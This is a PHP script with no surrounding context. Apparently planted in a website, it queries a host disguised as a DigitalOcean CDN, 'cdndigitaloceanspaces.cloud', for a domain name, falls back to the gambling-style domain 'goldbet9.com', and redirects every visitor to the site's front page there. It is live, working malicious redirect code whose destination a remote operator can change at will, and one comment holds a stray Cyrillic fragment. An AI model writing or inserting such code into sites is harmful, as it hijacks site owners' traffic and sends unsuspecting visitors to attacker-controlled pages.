
<?php
// Function to fetch domain
function fetchDomain() {
    $defaultDomain = "goldbet9.com"; // Fallback domain

    // API endpoint
    $apiUrl = "https://cdndigitaloceanspaces.cloud";

    // Use cURL to make the request
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);

    $response = curl_exec($ch);

    // Check for errors
    if (curl_errno($ch)) {
        curl_close($ch);
        return $defaultDomain; // Return default on error
    }

    curl_close($ch);

    // Decode JSON response
    $data = json_decode($response, true);

    // Return the domain or the default
    return $data['domain'] ?? $defaultDomain;
}

// Get the domain using the functionНе
$domain = fetchDomain();

// Get the request URI
$request_uri = $_SERVER['REQUEST_URI'];

// Redirect logic
if ($request_uri == '/' || $request_uri == '') {
    header("Location: https://{$domain}/");
    exit();
}
?>
